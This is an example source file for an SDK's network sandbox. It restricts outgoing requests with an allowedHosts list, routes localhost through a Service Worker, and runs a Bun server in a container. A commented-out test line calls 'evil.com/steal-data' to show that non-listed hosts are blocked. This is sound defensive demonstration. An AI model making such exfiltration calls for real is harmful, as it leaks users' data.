/**
 * Example 05 — Network Sandbox
 *
 * Demonstrates the network proxy layer:
 * - `allowedHosts` to restrict outgoing requests
 * - Service Worker registration for localhost interception
 * - Running a Bun HTTP server inside the container
 */
import { createBunContainer } from '@vitamin-ai/sdk'

async function main() {
  console.log('⏳ Booting container with network sandbox…')

  // ── Create a sandboxed container ────────────────────────────

  const container = await createBunContainer({
    // Only allow requests to these hosts
    allowedHosts: ['api.github.com', 'httpbin.org'],

    // Register the Service Worker to intercept localhost requests
    serviceWorkerUrl: new URL('../service-worker.ts', import.meta.url).toString(),

    env: {
      NODE_ENV: 'production',
    },

    files: {
      // A script that starts an HTTP server
      '/server.ts': `
        const server = Bun.serve({
          port: 3000,
          fetch(req: Request): Response {
            const url = new URL(req.url)

            if (url.pathname === '/') {
              return new Response('Hello from Vitamin Bun! 🚀')
            }

            if (url.pathname === '/json') {
              return Response.json({
                message: 'This server runs in your browser',
                timestamp: Date.now(),
              })
            }

            return new Response('Not Found', { status: 404 })
          },
        })

        console.log(\`Server running on port \${server.port}\`)
      `,

      // A script that makes an outgoing HTTP request
      '/fetch-test.ts': `
        // This should succeed (httpbin.org is in allowedHosts)
        try {
          const res = await fetch('https://httpbin.org/get')
          console.log('✅ httpbin.org response status:', res.status)
        } catch (e) {
          console.error('❌ httpbin.org request failed:', e)
        }

        // This would be blocked (not in allowedHosts)
        // Uncomment to test:
        // const res = await fetch('https://evil.com/steal-data')
      `,
    },
  })

  console.log('✅ Container ready')

  // ── Start the HTTP server ───────────────────────────────────

  console.log('\n--- Starting server ---')
  const serverProc = container.spawn('bun', ['run', '/server.ts'])

  serverProc.stdout.on('data', (data: Uint8Array) => {
    console.log('[server]', new TextDecoder().decode(data))
  })

  // Give the server a moment to start
  await new Promise((r) => setTimeout(r, 1000))

  // ── Make requests to the virtual server ─────────────────────

  // With the Service Worker registered, fetch('http://localhost:3000/...')
  // will be intercepted and routed to the WASM container.
  console.log('\n--- Making requests to virtual server ---')

  try {
    const res1 = await fetch('http://localhost:3000/')
    console.log('GET /:', await res1.text())

    const res2 = await fetch('http://localhost:3000/json')
    console.log('GET /json:', await res2.json())
  } catch (e) {
    console.log('(Service Worker not active — requests will fail in dev)')
  }

  // ── Run the fetch test ──────────────────────────────────────

  console.log('\n--- Running fetch test ---')
  const fetchResult = await container.exec('bun', ['run', '/fetch-test.ts'])
  console.log(fetchResult.stdout)

  // ── Cleanup ─────────────────────────────────────────────────

  serverProc.kill()
  await container.destroy()
  console.log('\n🏁 Done')
}

main().catch(console.error)
